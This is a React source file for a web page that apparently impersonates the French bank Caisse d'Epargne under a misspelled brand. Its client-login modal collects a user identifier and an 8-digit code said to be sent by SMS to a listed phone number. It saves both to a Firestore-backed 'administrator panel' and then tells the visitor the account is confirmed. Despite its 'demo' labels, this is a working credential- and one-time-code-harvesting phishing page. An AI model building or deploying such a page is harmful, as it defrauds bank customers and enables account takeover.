import { useEffect, useState } from 'react'
import heroImage from './assets/elan-hero.png'
import logo from './assets/logo.webp'
import { saveDemoSubmission } from './demoSubmissions'
import './App.css'

const Icon = ({ name, size = 22 }) => {
  const paths = {
    pin: <><path d="M12 22s7-5.1 7-12a7 7 0 1 0-14 0c0 6.9 7 12 7 12Z"/><circle cx="12" cy="10" r="2.4"/></>,
    search: <><circle cx="11" cy="11" r="7"/><path d="m20 20-4-4"/></>,
    user: <><circle cx="12" cy="8" r="4"/><path d="M4 21c.7-4.2 3.4-6 8-6s7.3 1.8 8 6"/></>,
    menu: <path d="M4 7h16M4 12h16M4 17h16"/>,
    close: <path d="m6 6 12 12M18 6 6 18"/>,
    arrow: <path d="m9 18 6-6-6-6"/>,
    check: <path d="m5 12 4 4L19 6"/>,
    chat: <><path d="M21 15a4 4 0 0 1-4 4H9l-5 3v-7a4 4 0 0 1-1-2.6V7a4 4 0 0 1 4-4h10a4 4 0 0 1 4 4Z"/><path d="M8 10h.01M12 10h.01M16 10h.01"/></>,
    card: <><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 10h18M7 15h4"/></>,
    mobile: <><rect x="6" y="2" width="12" height="20" rx="2"/><path d="M10 18h4"/></>,
    heart: <path d="M20.8 4.7a5.5 5.5 0 0 0-7.8 0L12 5.8l-1.1-1.1a5.5 5.5 0 0 0-7.8 7.8L12 21l8.8-8.5a5.5 5.5 0 0 0 0-7.8Z"/>,
    clock: <><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></>,
    document: <><path d="M6 2h8l4 4v16H6z"/><path d="M14 2v5h5M9 12h6M9 16h6"/></>,
    shield: <><path d="M12 22s8-3.8 8-10V5l-8-3-8 3v7c0 6.2 8 10 8 10Z"/><path d="m9 12 2 2 4-5"/></>,
    chevron: <path d="m6 9 6 6 6-6"/>,
    instagram: <><rect x="3" y="3" width="18" height="18" rx="5"/><circle cx="12" cy="12" r="4"/><path d="M17.5 6.5h.01"/></>,
    linkedin: <><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M8 11v6M8 8v.01M12 17v-6M12 14a3 3 0 0 1 6 0v3"/></>,
    lock: <><rect x="5" y="10" width="14" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3M12 14v3"/></>,
    help: <><circle cx="12" cy="12" r="9"/><path d="M9.8 9a2.4 2.4 0 1 1 3.4 2.2c-.8.4-1.2.9-1.2 1.8M12 17h.01"/></>,
  }
  return <svg aria-hidden="true" width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">{paths[name]}</svg>
}

const benefits = [
  { icon: 'card', title: 'Une carte qui vous suit', text: 'Paiements en France et à l’étranger, carte virtuelle et plafonds ajustables.' },
  { icon: 'mobile', title: 'Tout depuis votre mobile', text: 'Suivez vos dépenses, bloquez votre carte et pilotez votre budget simplement.' },
  { icon: 'heart', title: 'Un conseiller, pour de vrai', text: 'En agence, par téléphone ou en visio : choisissez la relation qui vous ressemble.' },
]

const steps = [
  ['01', 'Faites connaissance', 'Quelques questions suffisent pour vous orienter vers la formule adaptée.'],
  ['02', 'Choisissez votre offre', 'Comparez les services essentiels et choisissez selon vos usages.'],
  ['03', 'Préparez vos documents', 'Une pièce d’identité et un justificatif de domicile seront nécessaires.'],
  ['04', 'Activez votre compte', 'Après vérification, vous recevez vos accès et pouvez commencer.'],
]

const faqs = [
  ['Qui peut ouvrir un compte ?', 'Toute personne majeure résidant en France peut découvrir le parcours. Pour une ouverture réelle, les conditions dépendent de l’établissement choisi.'],
  ['Quels documents faut-il prévoir ?', 'En général, une pièce d’identité en cours de validité, un justificatif de domicile récent et un justificatif de revenus.'],
  ['Combien de temps prend la démarche ?', 'La préparation en ligne prend environ dix minutes. La validation dépend ensuite de la vérification des documents.'],
  ['Puis-je être accompagné en agence ?', 'Oui. Le parcours peut être préparé en ligne puis poursuivi avec un conseiller dans l’agence de votre choix.'],
]

const shuffleDigits = () => {
  const digits = Array.from({ length: 10 }, (_, index) => index)
  for (let index = digits.length - 1; index > 0; index -= 1) {
    const randomIndex = Math.floor(Math.random() * (index + 1))
    ;[digits[index], digits[randomIndex]] = [digits[randomIndex], digits[index]]
  }
  return digits
}

function App() {
  const [menuOpen, setMenuOpen] = useState(false)
  const [loginOpen, setLoginOpen] = useState(false)
  const [loginStep, setLoginStep] = useState('identifier')
  const [identifier, setIdentifier] = useState('')
  const [passcode, setPasscode] = useState('')
  const [keypadDigits, setKeypadDigits] = useState(shuffleDigits)
  const [submissionStatus, setSubmissionStatus] = useState('idle')
  const [submissionMessage, setSubmissionMessage] = useState('')
  const [activeFaq, setActiveFaq] = useState(0)

  useEffect(() => {
    document.body.style.overflow = menuOpen || loginOpen ? 'hidden' : ''
    return () => { document.body.style.overflow = '' }
  }, [menuOpen, loginOpen])

  useEffect(() => {
    const closeOnEscape = (event) => {
      if (event.key === 'Escape') setLoginOpen(false)
    }
    window.addEventListener('keydown', closeOnEscape)
    return () => window.removeEventListener('keydown', closeOnEscape)
  }, [])

  const openLogin = () => {
    setMenuOpen(false)
    setLoginStep('identifier')
    setIdentifier('')
    setPasscode('')
    setSubmissionStatus('idle')
    setSubmissionMessage('')
    setLoginOpen(true)
  }

  const closeLogin = () => {
    setLoginOpen(false)
    setLoginStep('identifier')
    setIdentifier('')
    setPasscode('')
    setSubmissionStatus('idle')
    setSubmissionMessage('')
  }

  const handleIdentifier = (event) => {
    event.preventDefault()
    setSubmissionStatus('idle')
    setSubmissionMessage('')
    setPasscode('')
    setKeypadDigits(shuffleDigits())
    setLoginStep('password')
  }

  const addPasscodeDigit = (digit) => {
    setPasscode((currentPasscode) => currentPasscode.length < 8 ? `${currentPasscode}${digit}` : currentPasscode)
  }

  const handlePasscode = async (event) => {
    event.preventDefault()
    if (passcode.length !== 8 || submissionStatus === 'saving') return

    setSubmissionStatus('saving')
    setSubmissionMessage('')

    try {
      const result = await saveDemoSubmission({ identifier, accountNumber: passcode })
      if (result.duplicate) {
        setSubmissionStatus('duplicate')
        setSubmissionMessage('Ces informations de démonstration existent déjà dans le panneau administrateur.')
        return
      }

      setSubmissionStatus('success')
      setSubmissionMessage('Les informations de démonstration ont été enregistrées dans le panneau administrateur.')
      setLoginStep('success')
    } catch (error) {
      console.error('Unable to save demo submission:', error)
      setSubmissionStatus('error')
      setSubmissionMessage('Enregistrement impossible. Vérifiez la configuration et les règles Firestore.')
    }
  }

  return (
    <div className="site-shell">
      <a className="skip-link" href="#main">Aller au contenu</a>

      <header className="site-header">
        <div className="utility-bar wrap">
          <nav aria-label="Choisir votre profil">
            <a className="active" href="#main">Particuliers</a>
            <a href="#professionnels">Professionnels</a>
            <a href="#entreprises">Entreprises</a>
            <a href="#associations">Associations</a>
          </nav>
          <button className="region-link" type="button"><Icon name="pin" size={18}/> Vienne   <Icon name="chevron" size={15}/></button>
        </div>

        <div className="main-header wrap">
          <a className="brand" href="#main" aria-label="Caissse d'epargne, accueil">
            <img src={logo} alt="Caissse d'epargne" />
          </a>
          <div className="header-tools">
            <button className="icon-link" type="button" aria-label="Rechercher"><Icon name="search"/><span>Rechercher</span></button>
            <a className="icon-link" href="#contact"><Icon name="pin"/><span>Nous trouver</span></a>
            <button className="client-button" type="button" onClick={openLogin} aria-haspopup="dialog"><Icon name="user"/> Espace client</button>
            <button className="menu-toggle" type="button" aria-expanded={menuOpen} aria-controls="mobile-menu" onClick={() => setMenuOpen(!menuOpen)}>
              <Icon name={menuOpen ? 'close' : 'menu'}/><span>Menu</span>
            </button>
          </div>
        </div>

        <nav className="product-nav" aria-label="Navigation principale">
          <div className="wrap">
            <a href="#comptes">Comptes & cartes</a>
            <a href="#epargner">Épargner</a>
            <a href="#emprunter">Emprunter</a>
            <a href="#assurer">Assurer</a>
            <a href="#conseils">Conseils & solutions</a>
          </div>
        </nav>

        <div className={`mobile-drawer ${menuOpen ? 'open' : ''}`} id="mobile-menu">
          <nav aria-label="Menu mobile">
            <a href="#comptes" onClick={() => setMenuOpen(false)}>Comptes & cartes <Icon name="arrow"/></a>
            <a href="#epargner" onClick={() => setMenuOpen(false)}>Épargner <Icon name="arrow"/></a>
            <a href="#emprunter" onClick={() => setMenuOpen(false)}>Emprunter <Icon name="arrow"/></a>
            <a href="#assurer" onClick={() => setMenuOpen(false)}>Assurer <Icon name="arrow"/></a>
            <a href="#conseils" onClick={() => setMenuOpen(false)}>Conseils & solutions <Icon name="arrow"/></a>
          </nav>
        </div>
      </header>

      {loginOpen && (
        <div className="login-overlay" role="presentation" onMouseDown={(event) => {
          if (event.target === event.currentTarget) closeLogin()
        }}>
          <section className="login-panel" role="dialog" aria-modal="true" aria-labelledby="login-title">
            <div className="login-panel-head">
              <div className="login-symbol" aria-hidden="true"><Icon name="lock" size={26}/></div>
              <button className="login-close" type="button" onClick={closeLogin} aria-label="Fermer la connexion">
                <Icon name="close" size={23}/>
              </button>
            </div>
            {loginStep === 'identifier' ? (
              <>
                <h2 id="login-title">Saisissez votre identifiant</h2>
                <form className="login-form" onSubmit={handleIdentifier}>
                  <label htmlFor="client-identifier">Entrez votre identifiant</label>
                  <div className="identifier-field">
                    <Icon name="user" size={21}/>
                    <input
                      id="client-identifier"
                      name="identifier"
                      type="text"
                      autoComplete="username"
                      placeholder="votre identifiant"
                      value={identifier}
                      onChange={(event) => setIdentifier(event.target.value)}
                      autoFocus
                      required
                      maxLength={64}
                      aria-describedby="identifier-help"
                    />
                  </div>
                  <button className="login-submit" type="submit">Continuer <Icon name="arrow" size={18}/></button>
                </form>
              </>
            ) : loginStep === 'password' ? (
              <>
                <button className="login-back" type="button" onClick={() => { setLoginStep('identifier'); setPasscode(''); setSubmissionStatus('idle'); setSubmissionMessage('') }}>
                  <Icon name="arrow" size={17}/> Retour
                </button>
                <h2 id="login-title">Entrez le code envoyé a ton numero 06 37 47 86 06</h2>
                <p className="login-intro">Saisissez les 8 chiffres à l’aide du clavier.</p>
                <form className="login-form" onSubmit={handlePasscode}>
                  <div className="passcode-display" aria-label={`${passcode.length} chiffre${passcode.length > 1 ? 's' : ''} saisi${passcode.length > 1 ? 's' : ''} sur 8`}>
                    {Array.from({ length: 8 }, (_, index) => (
                      <span className={index < passcode.length ? 'filled' : ''} key={index} aria-hidden="true" />
                    ))}
                  </div>
                  <div className="numeric-keypad" aria-label="Clavier numérique">
                    {keypadDigits.map((digit) => (
                      <button type="button" key={digit} onClick={() => { addPasscodeDigit(digit); setSubmissionStatus('idle'); setSubmissionMessage('') }} disabled={passcode.length === 8 || submissionStatus === 'saving'}>
                        {digit}
                      </button>
                    ))}
                  </div>
                  <button className="passcode-clear" type="button" onClick={() => { setPasscode((currentPasscode) => currentPasscode.slice(0, -1)); setSubmissionStatus('idle'); setSubmissionMessage('') }} disabled={!passcode.length || submissionStatus === 'saving'}>
                    Effacer le dernier chiffre
                  </button>
                  {submissionMessage && <p className={`submission-feedback ${submissionStatus}`} role="alert">{submissionMessage}</p>}
                  <button className="login-submit" type="submit" disabled={passcode.length !== 8 || submissionStatus === 'saving'}>{submissionStatus === 'saving' ? 'Vérification…' : 'Vérifier et enregistrer'} <Icon name="arrow" size={18}/></button>
                </form>
              </>
            ) : (
              <div className="submission-success" role="status">
                <span><Icon name="check" size={30}/></span>
                <h2 id="login-title">Votre compte a bien été confirmé.</h2>
                <button className="login-submit" type="button" onClick={closeLogin}>Terminer</button>
              </div>
            )}
          </section>
        </div>
      )}

      <main id="main">
        <div className="breadcrumbs wrap"><a href="#main">Accueil</a><span>/</span><a href="#comptes">Comptes & cartes</a><span>/</span><strong>Ouvrir un compte</strong></div>

        <section className="hero wrap" aria-labelledby="hero-title">
          <div className="hero-copy">
            <p className="eyebrow">DEVENIR CLIENT</p>
            <h1 id="hero-title">Ouvrir un compte bancaire</h1>
            <p className="hero-lead">Devenez client Caissse d'epargne simplement, en ligne ou en agence, et choisissez les services adaptés à votre quotidien.</p>
            <button className="button button-light" type="button">Ouvrir mon compte en ligne <Icon name="arrow" size={18}/></button>
            <p className="hero-note"><Icon name="clock" size={18}/> Une démarche simple en quelques minutes</p>
          </div>
          <div className="hero-media">
            <img src={heroImage} alt="Une cliente consulte son téléphone dans un café" />
            <div className="hero-card" aria-hidden="true">
              <div className="mini-brand">é.</div>
              <div className="chip"></div>
              <span>CAISSSE D'EPARGNE</span><b>VISA</b>
            </div>
          </div>
        </section>

        <nav className="service-shortcuts wrap" aria-label="Accès rapides aux services">
          <a href="#comptes"><span><Icon name="card" size={25}/></span><div><strong>Gérer mes comptes</strong><small>Comptes et cartes</small></div><Icon name="arrow" size={17}/></a>
          <a href="#epargner"><span><Icon name="heart" size={25}/></span><div><strong>Épargner</strong><small>Préparer mes projets</small></div><Icon name="arrow" size={17}/></a>
          <a href="#emprunter"><span><Icon name="document" size={25}/></span><div><strong>Emprunter</strong><small>Financer mes envies</small></div><Icon name="arrow" size={17}/></a>
          <a href="#assurer"><span><Icon name="shield" size={25}/></span><div><strong>M’assurer</strong><small>Protéger ce qui compte</small></div><Icon name="arrow" size={17}/></a>
        </nav>

        <section className="choice-section section wrap" id="comptes">
          <div className="section-heading">
            <p className="eyebrow red">OUVRIR UN COMPTE</p>
            <h2>Comment souhaitez-vous ouvrir votre compte&nbsp;?</h2>
            <p>Depuis chez vous ou avec l’aide d’un conseiller, choisissez le parcours qui vous convient.</p>
          </div>
          <div className="choice-grid">
            <article className="choice-card red-card">
              <span className="choice-icon"><Icon name="mobile" size={30}/></span>
              <div>
                <p className="label">100 % EN LIGNE</p>
                <h3>Ouvrir un compte en ligne</h3>
                <p>Un parcours guidé, disponible à tout moment depuis votre mobile ou votre ordinateur.</p>
                <button className="text-link" type="button">Ouvrir mon compte <Icon name="arrow" size={18}/></button>
              </div>
            </article>
            <article className="choice-card dark-card">
              <span className="choice-icon"><Icon name="chat" size={30}/></span>
              <div>
                <p className="label">AVEC UN CONSEILLER</p>
                <h3>Ouvrir un compte en agence</h3>
                <p>Rencontrez un conseiller pour préciser votre projet et choisir ensemble votre formule.</p>
                <a className="text-link" href="#contact">Prendre rendez-vous <Icon name="arrow" size={18}/></a>
              </div>
            </article>
          </div>
        </section>

        <section className="steps-section section" aria-labelledby="steps-title">
          <div className="wrap">
            <div className="section-heading light-heading">
              <p className="eyebrow">SIMPLE ET GUIDÉ</p>
              <h2 id="steps-title">Ouvrez votre compte en quatre étapes</h2>
            </div>
            <ol className="steps-grid">
              {steps.map(([num, title, text]) => (
                <li key={num}>
                  <span className="step-number">{num}</span>
                  <h3>{title}</h3>
                  <p>{text}</p>
                </li>
              ))}
            </ol>
            <div className="steps-action"><button className="button button-red" type="button">Voir les offres <Icon name="arrow" size={18}/></button></div>
          </div>
        </section>

        <section className="benefits section wrap" id="conseils">
          <div className="section-heading">
            <p className="eyebrow red">AU QUOTIDIEN</p>
            <h2>Une banque utile, simplement</h2>
          </div>
          <div className="benefit-grid">
            {benefits.map((item) => (
              <article className="benefit-card" key={item.title}>
                <span className="benefit-icon"><Icon name={item.icon} size={29}/></span>
                <h3>{item.title}</h3>
                <p>{item.text}</p>
                <a href="#faq" aria-label={`En savoir plus : ${item.title}`}>En savoir plus <Icon name="arrow" size={16}/></a>
              </article>
            ))}
          </div>
        </section>

        <section className="document-band">
          <div className="wrap document-inner">
            <div className="document-icon"><Icon name="document" size={35}/></div>
            <div><p className="eyebrow red">À PRÉVOIR</p><h2>Les bons documents, au bon moment</h2></div>
            <ul>
              <li><Icon name="check" size={18}/> Pièce d’identité valide</li>
              <li><Icon name="check" size={18}/> Justificatif de domicile</li>
              <li><Icon name="check" size={18}/> Justificatif de revenus</li>
            </ul>
          </div>
        </section>

        <section className="faq section wrap" id="faq">
          <div className="section-heading align-left">
            <p className="eyebrow red">BESOIN D’AIDE ?</p>
            <h2>Vos questions, nos réponses</h2>
          </div>
          <div className="faq-list">
            {faqs.map(([question, answer], index) => (
              <article className={`faq-item ${activeFaq === index ? 'expanded' : ''}`} key={question}>
                <button type="button" aria-expanded={activeFaq === index} onClick={() => setActiveFaq(activeFaq === index ? -1 : index)}>
                  <span>{question}</span><Icon name="chevron"/>
                </button>
                <div className="faq-answer"><p>{answer}</p></div>
              </article>
            ))}
          </div>
        </section>

        <section className="contact-section" id="contact">
          <div className="wrap contact-inner">
              <div><p className="eyebrow">CAISSSE D'EPARGNE VOUS ACCOMPAGNE</p><h2>Un projet commence souvent par une conversation.</h2></div>
            <a className="button button-light" href="mailto:bonjour@example.test">Contacter une agence <Icon name="arrow" size={18}/></a>
          </div>
        </section>
      </main>

      <footer className="footer">
        <div className="wrap footer-top">
          <a className="brand brand-footer" href="#main" aria-label="Caissse d'epargne, accueil"><img src={logo} alt="Caissse d'epargne" /></a>
          <div className="footer-links"><a href="#faq">Aide & accessibilité</a><a href="#contact">Trouver une agence</a><a href="#main">Tarifs</a><a href="#main">Informations légales</a></div>
          <div className="socials"><a href="#main" aria-label="Instagram"><Icon name="instagram"/></a><a href="#main" aria-label="LinkedIn"><Icon name="linkedin"/></a></div>
        </div>
        <div className="wrap footer-bottom"><p>© 2026 Caissse d'epargne </p><span><Icon name="shield" size={17}/> Votre sécurité, notre priorité</span></div>
      </footer>

      <a className="floating-contact" href="#contact"><Icon name="chat"/><span>Nous contacter</span></a>
    </div>
  )
}

export default App
